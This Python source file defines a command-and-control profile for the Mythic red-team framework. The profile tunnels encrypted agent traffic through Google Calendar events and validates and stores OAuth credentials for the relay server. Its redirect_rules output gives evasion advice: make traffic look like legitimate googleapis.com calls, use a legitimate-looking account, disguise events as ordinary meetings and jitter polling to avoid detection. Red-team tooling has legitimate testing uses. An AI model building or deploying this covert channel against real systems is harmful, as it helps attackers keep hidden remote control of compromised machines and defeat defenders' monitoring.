from mythic_container.C2ProfileBase import *
from mythic_container.MythicGoRPC.send_mythic_rpc_file_get_content import *
import json
from pathlib import Path


class Epoch(C2Profile):
    name = "epoch"
    description = "Mythic relay over Google Calendar — shuttles encrypted blobs; does not decrypt"
    author = "@0xNirvana"
    is_p2p = False
    is_server_routed = False
    server_folder_path = Path(".") / "c2_code"
    server_binary_path = server_folder_path / "server.py"
    agent_icon_path = Path(".") / "mythic" / "epoch.svg"
    dark_mode_agent_icon_path = Path(".") / "mythic" / "epoch_darkmode.svg"
    
    parameters = [
        C2ProfileParameter(
            name="AESPSK",
            description="Crypto type",
            default_value="aes256_hmac",
            parameter_type=ParameterType.ChooseOne,
            choices=["aes256_hmac", "none"],
            required=False,
            crypto_type=True
        ),
        C2ProfileParameter(
            name="calendar_id",
            description="Full shared calendar ID from Google Calendar settings (e.g. xxx@group.calendar.google.com)",
            default_value="",
            parameter_type=ParameterType.String,
            required=True,
        ),
        C2ProfileParameter(
            name="poll_interval",
            description="How often agent checks calendar (seconds). Lower values improve responsiveness but increase API usage.",
            parameter_type=ParameterType.Number,
            required=False,
            default_value=20,
        ),
        C2ProfileParameter(
            name="callback_jitter",
            description="Jitter percentage for poll interval",
            parameter_type=ParameterType.Number,
            required=False,
            default_value=20,
        ),
        C2ProfileParameter(
            name="credentials_file",
            description="Google OAuth2 credentials JSON file",
            parameter_type=ParameterType.File,
            required=True,
        ),
        C2ProfileParameter(
            name="killdate",
            description="Kill Date for the agent to stop running",
            parameter_type=ParameterType.Date,
            required=False,
            default_value=365,
        ),
        C2ProfileParameter(
            name="event_hmac_key",
            description="Shared secret for authenticating calendar events (base64, 32 bytes). Leave empty to disable. Generate with: python3 -c \"import os,base64;print(base64.b64encode(os.urandom(32)).decode())\"",
            parameter_type=ParameterType.String,
            required=False,
            default_value="",
        ),
        C2ProfileParameter(
            name="debug",
            description="Enable verbose server logging",
            parameter_type=ParameterType.ChooseOne,
            choices=["false", "true"],
            required=False,
            default_value="false",
        ),
    ]

    async def redirect_rules(self, inputMsg: C2GetRedirectorRulesMessage) -> C2GetRedirectorRulesMessageResponse:
        """Epoch doesn't use traditional redirectors since it uses Google Calendar API"""
        response = C2GetRedirectorRulesMessageResponse(Success=True)
        output = "########################################\n"
        output += "## Epoch - No Traditional Redirector Rules\n"
        output += "## This C2 profile uses Google Calendar API as the communication channel\n"
        output += "## Traffic appears as legitimate Google Calendar API calls\n"
        output += "##\n"
        output += "## OpSec Considerations:\n"
        output += "## - All traffic goes to googleapis.com (legitimate)\n"
        output += "## - Uses standard OAuth2 authentication\n"
        output += "## - Calendar events look like normal meetings\n"
        output += "## - Poll intervals should match typical calendar sync (30-120s)\n"
        output += "##\n"
        output += "## For additional obfuscation:\n"
        output += "## 1. Use a legitimate-looking Google account\n"
        output += "## 2. Mix with real calendar events\n"
        output += "## 3. Use business-appropriate event titles\n"
        output += "## 4. Vary poll intervals with jitter\n"
        output += "########################################\n"
        response.Message = output
        return response

    async def config_check(self, inputMsg: C2ConfigCheckMessage) -> C2ConfigCheckMessageResponse:
        """Validate the C2 profile configuration"""
        output = ""
        try:
            # Check credentials file
            credData = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
                AgentFileId=inputMsg.Parameters["credentials_file"]
            ))
            
            if not credData.Success:
                return C2ConfigCheckMessageResponse(Success=False, Error=credData.Error)
            
            # Validate it's proper JSON
            try:
                creds = json.loads(credData.Content)
                if "installed" in creds:
                    output += "[+] OAuth2 Desktop App credentials detected\n"
                elif "web" in creds:
                    output += "[+] OAuth2 Web App credentials detected\n"
                elif "type" in creds and creds["type"] == "service_account":
                    output += "[+] Service Account credentials detected (headless auth)\n"
                else:
                    return C2ConfigCheckMessageResponse(
                        Success=False, 
                        Error="Invalid credentials format. Need 'installed', 'web', or 'service_account' type."
                    )
            except json.JSONDecodeError:
                return C2ConfigCheckMessageResponse(
                    Success=False, 
                    Error="Credentials file is not valid JSON"
                )
            
            output += "[+] Google credentials file validated\n"
            
            # Check calendar ID format
            calendar_id = (inputMsg.Parameters.get("calendar_id") or "").strip()
            if not calendar_id:
                return C2ConfigCheckMessageResponse(
                    Success=False,
                    Error="Calendar ID cannot be empty — paste the full ID from Google Calendar settings"
                )
            if calendar_id == "primary":
                return C2ConfigCheckMessageResponse(
                    Success=False,
                    Error="Use the full shared calendar ID (xxx@group.calendar.google.com), not 'primary'"
                )
            output += f"[+] Calendar ID: {calendar_id}\n"
            
            # Check poll interval
            poll_interval = inputMsg.Parameters.get("poll_interval", 20)
            if poll_interval < 10:
                output += "[!] Warning: Poll interval < 10 seconds may trigger rate limiting\n"
            else:
                output += f"[+] Poll interval: {poll_interval} seconds\n"
            
            output += "\n[+] Configuration validated successfully!\n"
            output += f"[+] Protocol: V2 (encrypted calendar events with extendedProperties routing)\n"
            
            # Write credentials to server folder for server.py to use
            try:
                creds_path = self.server_folder_path / "credentials.json"
                creds_content = credData.Content.decode('utf-8') if isinstance(credData.Content, bytes) else credData.Content
                with open(creds_path, 'w') as f:
                    f.write(creds_content)
                output += f"[+] Credentials written to {creds_path}\n"
            except Exception as e:
                output += f"[!] Warning: Could not write credentials file: {e}\n"

            # Write server config with HMAC key and other settings
            try:
                config_path = self.server_folder_path / "config.json"
                server_config = {
                    "calendar_id": calendar_id,
                    "poll_interval": poll_interval,
                    "debug": inputMsg.Parameters.get("debug", "false") == "true",
                    "max_event_age_hours": 3,
                    "event_hmac_key": inputMsg.Parameters.get("event_hmac_key", ""),
                }
                with open(config_path, 'w') as f:
                    json.dump(server_config, f, indent=2)
                output += "[+] Server config written\n"
                if server_config["event_hmac_key"]:
                    output += "[+] Event HMAC authentication enabled\n"
                else:
                    output += "[!] Event HMAC disabled — calendar events are unauthenticated\n"
            except Exception as e:
                output += f"[!] Warning: Could not write config: {e}\n"
            
            output += "\nNext steps:\n"
            output += "1. Ensure Google Calendar API is enabled in your GCP project\n"
            output += "2. Build a Chronos payload (config check writes c2_code/config.json)\n"
            output += "3. Start the profile, then run the agent\n"
            
            return C2ConfigCheckMessageResponse(Success=True, Message=output)
            
        except Exception as e:
            return C2ConfigCheckMessageResponse(
                Success=False, 
                Error=f"Configuration check failed: {str(e)}"
            )
